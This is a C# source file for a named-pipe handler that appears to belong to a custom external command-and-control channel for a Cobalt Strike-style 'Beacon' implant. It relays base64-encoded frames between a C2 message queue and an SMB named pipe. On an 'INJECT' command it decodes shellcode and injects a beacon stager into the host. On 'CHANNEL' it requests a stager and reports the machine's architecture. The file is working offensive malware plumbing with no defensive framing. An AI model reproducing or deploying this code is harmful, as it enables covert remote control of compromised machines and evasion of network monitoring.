using Beacon.Models;
using System;
using System.Collections.Generic;
using System.IO;
using System.IO.Pipes;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace Beacon.Handlers
{
    public class NamePipeHandler
    {
        private const int MaxBufferSize = 1024 * 1024;


        public NamePipeHandler(string pipeName, string beaconId)
        {
            PipeName = pipeName;
            BeaconId = beaconId;
        }


        public int ExternalId { get; set; }

        public string PipeName { get; set; }
        public int RunCount { get; set; }
        public bool RunningOtherCommand { get; set; }
        public string BeaconId { get; set; }


        public NamedPipeClientStream Client { get; set; }


        public bool Connected => Client?.IsConnected ?? false;

        public bool Connect()
        {
            Client = new NamedPipeClientStream(PipeName.ToString());

            var tries = 0;
            while (Client.IsConnected == false)
            {
                if (tries == 20) break; // Failed to connect

                Client.Connect();
                tries += 1;

                Thread.Sleep(1000);
            }

            return Client.IsConnected;
        }

        public void Close()
        {
            Client.Close();
        }

        public void Dispose()
        {
            Client.Close();
        }

        public byte[] ReadFrame()
        {
            var reader = new BinaryReader(Client);
            var bufferSize = reader.ReadInt32();
            var size = bufferSize > MaxBufferSize
                ? MaxBufferSize
                : bufferSize;

            return reader.ReadBytes(size);
        }

        public void SendFrame(byte[] buffer)
        {
            var writer = new BinaryWriter(Client);

            writer.Write(buffer.Length);
            writer.Write(buffer);
        }
        public static int is64Bit()
        {
            if (IntPtr.Size == 4)
                return 0;

            return 1;
        }



        public (BeaconMsg beaconMsg, bool stopHandler) ProcessMessage(BeaconMsg beaconMsg)
        {
            //This hold the C2 communcation protocol logic
            BeaconMsg responseMsg = new BeaconMsg()
            {
                From = beaconMsg.To,
                To = beaconMsg.From,
                Queue = beaconMsg.Queue
            };

            // <beacon-id>:<COMMAND>:<PAYLOAD-B64>

            if (Connected)
            {
                
                RunningOtherCommand = true;

               var byteArray = Convert.FromBase64String(beaconMsg.Payload);

                SendFrame(byteArray);


                var readBuffer = ReadFrame();
                if (readBuffer.Length > 0)
                {
                    responseMsg.Command = ":COM:";
                    responseMsg.Payload = Convert.ToBase64String(readBuffer);


                }

                RunningOtherCommand = false;

                //  RunCount++;

                return (responseMsg, false);
                // }

            }
            else if (beaconMsg.Command.Equals("CHANNEL"))
            {
                //We need to stop the current channel and start the new one
                responseMsg.Command = "GETSTAGER";
                responseMsg.Payload = PipeName + ":" + is64Bit() ;
                responseMsg.Queue = beaconMsg.Payload;

                return (responseMsg, true);
            }
            else if (!Connected && beaconMsg.Command.Equals("INJECT"))
            {

                var shellcode = Convert.FromBase64String(beaconMsg.Payload);

                Console.WriteLine($"[+] Performing injection");

                //Inject the beacon
                InjectionHandler.InjectStager(shellcode);

                //Start the SMBPIPE
                Console.WriteLine($"[+] Getting and sending beacon ID");
                Connect();

                var buffer = ReadFrame();
                if (buffer.Length > 0)
                {
                    if (ExternalId == 0 && buffer.Length == 132)
                    {
                        ExtractId(buffer);
                    }

                    responseMsg.Command = ":COM:";
                    responseMsg.Payload = Convert.ToBase64String(buffer);

                    return (responseMsg, false);
                }
            }

            return (responseMsg, false);
        }

        public void ExtractId(byte[] frame)
        {
            using (var reader = new BinaryReader(new MemoryStream(frame)))
                ExternalId = reader.ReadInt32();

            Console.WriteLine($"[+] Extracted External Beacon Id: {ExternalId}");
        }

    }

}
